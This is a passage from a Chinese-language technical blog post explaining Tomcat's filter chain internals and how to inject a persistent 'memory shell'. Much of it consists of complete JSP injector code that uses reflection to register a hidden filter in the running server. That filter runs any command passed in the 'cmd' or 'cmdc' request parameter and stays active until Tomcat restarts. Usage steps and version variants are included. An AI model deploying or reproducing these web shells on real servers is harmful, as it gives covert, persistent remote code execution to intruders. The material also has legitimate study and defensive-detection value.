class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;DefaultFilter&quot;</span>;</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); </span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">DefaultFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/abcd&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">    out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    out.write(<span class="string">&quot;Injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h2><p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
<p>通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
<ol>
<li><p>使用 <code>ServletContext</code> 的 <code>addFilter</code>&#x2F;<code>createFilter</code> 方法注册；</p>
</li>
<li><p>使用 <code>ServletContextListener</code> 的 <code>contextInitialized</code> 方法在服务器启动时注册（将会在 <code>Listener</code> 中进行描述）；</p>
</li>
<li><p>使用 <code>ServletContainerInitializer</code> 的 <code>onStartup</code> 方法在初始化时注册（非动态，后面会描述）。</p>
</li>
</ol>
<p>首先来看一下 createFilter 方法，按照注释，这个类用来在调用 addFilter 向 ServletContext 实例化一个指定的 Filter 类。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown20220714103258.png"></p>
<p>这个类还约定了一个事情，那就是如果这个<code>ServletContext</code>传递给<code>ServletContextListener</code>的<code>ServletContextListener.contextInitialized</code>方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 <code>javax.servlet.annotation.WebListener</code> 进行注释，则会抛出 <code>UnsupportedOperationException</code> 异常，这个约定其实是非常重要的一点。</p>
<p>接下来看 <code>addFilter</code> 方法，<code>ServletContext</code> 中有三个重载方法，<font color="red"><strong>分别接收字符串类型的 filterName</strong></font>以及 <font color="green"><strong>Filter 对象&#x2F;className 字符串</strong></font><font color="bule"><strong>&#x2F;Filter 子类的 Class 对象</strong></font>，提供不同场景下添加 filter 的功能，这些方法均返回 <code>FilterRegistration.Dynamic</code> 实际上就是 <code>FilterRegistration</code> 对象。</p>
<p><code>addFilter</code> 方法实际上就是动态添加 <code>filter</code> 的最核心和关键的方法，但是这个类中同样约定了 <code>UnsupportedOperationException</code> 异常。</p>
<p>由于 Servlet API 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown20220714104320.png"></p>
<p>可以看到，这个方法创建了一个 <code>FilterDef</code> 对象，将 <code>filterName、filterClass、filter</code> 对象初始化进去，使用 <code>StandardContext</code> 的 <code>addFilterDef</code> 方法将创建的 <code>FilterDef</code> 储存在了 <code>StandardContext</code> 中的一个 <code>Hashmap filterDefs</code> 中，然后 new 了一个 <code>ApplicationFilterRegistration</code> 对象并且返回，并没有将这个 Filter 放到 FilterChain 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，<u><strong>如果程序以及处于运行状态中，则不能添加 Filter</strong></u>。</p>
<p>这时我们肯定要想，能不能直接操纵 FilterChain 呢？FilterChain 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 Filter，这个方法接受一个 <code>ApplicationFilterConfig</code> 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，<u><strong>因为对于每次请求需要执行的 FilterChain 都是动态取得的</strong></u>。</p>
<p>那Tomcat 是如何处理一次请求对应的 FilterChain 的呢？在 <code>ApplicationFilterFactory</code> 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p>
<ul>
<li>在 <code>context</code> 中获取 <code>filterMaps</code>，并遍历匹配 url 地址和请求是否匹配；</li>
<li>如果匹配则在 <code>context</code> 中根据 <code>filterMaps</code> 中的 <code>filterName</code> 查找对应的 <code>filterConfig</code>；</li>
<li>如果获取到 <code>filterConfig</code>，则将其加入到 <code>filterChain</code> 中</li>
<li>后续将会循环 <code>filterChain</code> 中的全部 <code>filterConfig</code>，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 doFilter 方法。</li>
<li>通过上述流程可以知道，每次请求的 <code>FilterChain</code> 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 <code>StandardContext</code> 中 <code>filterMaps</code> 中添加 <code>FilterMap</code>，在 <code>filterConfigs</code> 中添加 <code>ApplicationFilterConfig</code>。这样程序创建时就可以找到添加的 Filter 了。</li>
</ul>
<p>在之前的 <code>ApplicationContext</code> 的 <code>addFilter</code> 中将 <code>filter</code> 初始化存在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中，那后面又是如何添加在其他参数中的呢？</p>
<p>在 StandardContext 的 <code>filterStart</code> 方法中生成了 filterConfigs：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714105806.png"></p>
<p>在 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps：</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220714110008.png"></p>
<p>而这两者的信息都是从 <code>filterDefs</code> 中的对象获取的。</p>
<p>在了解了上述逻辑后，在应用程序中动态的添加一个 filter 的思路就清晰了：</p>
<ul>
<li>调用 <code>ApplicationContext</code> 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li>
<li>调用 <code>StandardContext</code> 的 filterStart 方法生成 filterConfigs；</li>
<li>调用 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 生成 filterMaps；</li>
<li>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 <code>StandardContext</code> 的 <code>addFilterMapBefore</code> 直接加在 filterMaps 的第一位。</li>
</ul>
<p>基于以上思路的实现在 <a href="https://xz.aliyun.com/t/7388">threedr3am 师傅的这篇文章</a>中有实现代码，我这里不再重复，而且这种实现方式也不适合我，既然知道了需要修改的关键位置，那就没有必要调用方法去改，直接用反射加进去就好了，其中中间还有很多小细节可以变化，但都不是重点，略过。</p>
<p>具体实现代码如下：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220620150400.png"></p>
<p>可以看到请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行</p>
<p>自定义一个filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zzddhmt7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter初始化创建....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span><br><span class="line"><span class="params">                         FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;进行过滤操作......&quot;</span>);</span><br><span class="line">        <span class="comment">// 放行</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在web.xml中注册filter，这里我设置url-pattern为 &#x2F;demo 即访问 &#x2F;demo 才会触发</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost:8080/demo</code> ，就可以发现成功触发</p>
<p>过程：</p>
<ul>
<li>创建恶意 <code>filter</code> ;</li>
<li>用 <code>filterDef</code> 对 <code>filter</code> 进行封装 ;</li>
<li>将 filterDef 添加到 filterDefs 跟 filterConfigs 中</li>
<li>创建一个新的 filterMap 将 URL 跟 filter 进行绑定，并添加到 filterMaps 中。要注意的是，因为 filter 生效会有一个先后顺序，所以一般来讲我们还需要把我们的 filter 给移动到 FilterChain 的第一位去;</li>
<li>每次请求 <code>createFilterChain</code> 都会依据此动态生成一个过滤链，而 <code>StandardContext</code> 又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启;</li>
</ul>
<p>访问下面这个 <code>jsp</code> ，注入成功后，用 <code>?cmd=</code> 即可命令执行（该方法只支持 Tomcat 7.x 以上，因为 <code>javax.servlet.DispatcherType</code> 类是 <code>servlet 3</code> 以后引入，而 <code>Tomcat 7</code> 以上才支持 <code>Servlet 3</code> ）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>适用更多版本的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span></span><br><span class="line"><span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.InvocationTargetException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="number">1</span> revise the <span class="keyword">import</span> <span class="keyword">class</span> <span class="title class_">with</span> correct tomcat version --&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span> request <span class="built_in">this</span> jsp file --&gt;</span><br><span class="line">&lt;!-- <span class="number">3</span> request xxxx/<span class="built_in">this</span> file/../abcd?cmdc=calc --&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DefaultFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdc&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmdc&quot;</span>));</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;exec done&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;DefaultFilter&quot;</span>;</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); </span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext); </span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="type">DefaultFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFilter</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    <span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/abcd&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    